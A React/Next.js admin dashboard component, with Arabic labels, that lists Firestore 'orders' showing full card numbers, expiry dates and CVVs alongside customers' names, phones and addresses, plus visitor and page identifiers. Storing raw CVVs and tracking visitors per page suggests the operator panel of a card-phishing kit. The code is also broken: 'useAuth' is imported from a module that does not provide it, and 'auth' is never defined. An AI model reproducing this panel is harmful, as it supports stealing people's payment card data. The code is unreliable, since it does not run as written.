'use client';

import { useEffect, useState } from 'react';
import { collection, onSnapshot, orderBy, query } from 'firebase/firestore';
import { signOut } from 'firebase/auth';
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from '@/app/components/ui/card';
import { useRouter } from 'next/navigation';
import { db } from '../lib/firebase';
import { Button } from './ui/button';
import { Badge } from './ui/badge';
import { Separator } from '@radix-ui/react-separator';
import useAuth from 'firebase/auth';

interface OrderData {
  id: string;
  createdAt: string;
  pageName: string;
  payment: {
    method: string;
    status: string;
  };
  values: {
    cardNumber: string;
    cvv: string;
    expiryDate: string;
    paymentMethod: string;
  };
  shipping: {
    area: string;
    block: string;
    fullName: string;
    governorate: string;
    house: string;
    phone: string;
    street: string;
  };
  status: string;
  visitor: string;
}

export function OrderDetails({
  initialOrders,
}: {
  initialOrders: OrderData[];
}) {
  const [orders, setOrders] = useState<OrderData[]>(initialOrders);
  const router = useRouter();
  const { user } = useAuth();

  useEffect(() => {
    if (!user) {
      router.push('/login');
      return;
    }

    const q = query(collection(db, 'orders'), orderBy('createdAt', 'desc'));

    const unsubscribe = onSnapshot(q, (snapshot) => {
      const newOrders = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      })) as OrderData[];
      setOrders(newOrders);
    });

    return () => unsubscribe();
  }, [user, router]);

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push('/login');
    } catch (error) {
      console.error('Error logging out:', error);
    }
  };

  return (
    <div className="min-h-screen bg-[#1a1f2e] text-white p-6" dir="rtl">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex justify-between items-center mb-6">
          <h1 className="text-2xl font-bold">تفاصيل الطلبات</h1>
          <Button
            onClick={handleLogout}
            variant="outline"
            className="border-gray-600 text-white hover:bg-gray-700"
          >
            تسجيل الخروج
          </Button>
        </div>

        {orders.map((order) => (
          <Card key={order.id} className="bg-[#1e2536] border-gray-700">
            <CardHeader>
              <div className="flex justify-between items-center">
                <CardTitle className="text-xl">
                  طلب #{order.id.slice(0, 8)}
                </CardTitle>
                <Badge
                  variant={
                    order.payment.status === 'pending'
                      ? 'destructive'
                      : 'default'
                  }
                  className="bg-red-500"
                >
                  {order.payment.status === 'pending'
                    ? 'قيد الانتظار'
                    : order.payment.status}
                </Badge>
              </div>
            </CardHeader>
            <CardContent className="space-y-6">
              {/* Basic Information */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h3 className="text-gray-400 mb-2">معلومات أساسية</h3>
                  <div className="space-y-2">
                    <p>
                      تاريخ الإنشاء:{' '}
                      {new Date(order.createdAt).toLocaleString('ar-SA')}
                    </p>
                    <p>الصفحة: {order.pageName}</p>
                    <p>رقم الزائر: {order.visitor}</p>
                  </div>
                </div>
              </div>

              <Separator className="border-gray-700" />

              {/* Payment Information */}
              <div>
                <h3 className="text-gray-400 mb-2">معلومات الدفع</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <p>طريقة الدفع: {order.payment.method}</p>
                    <p>حالة الدفع: {order.payment.status}</p>
                  </div>
                  <div className="space-y-2">
                    <p>رقم البطاقة: {order.values.cardNumber}</p>
                    <p>تاريخ الانتهاء: {order.values.expiryDate}</p>
                    <p>CVV: {order.values.cvv}</p>
                  </div>
                </div>
              </div>

              <Separator className="border-gray-700" />

              {/* Shipping Information */}
              <div>
                <h3 className="text-gray-400 mb-2">معلومات الشحن</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <p>الاسم الكامل: {order.shipping.fullName}</p>
                    <p>رقم الهاتف: {order.shipping.phone}</p>
                    <p>المحافظة: {order.shipping.governorate}</p>
                  </div>
                  <div className="space-y-2">
                    <p>المنطقة: {order.shipping.area}</p>
                    <p>القطعة: {order.shipping.block}</p>
                    <p>المنزل: {order.shipping.house}</p>
                    <p>الشارع: {order.shipping.street}</p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>
    </div>
  );
}
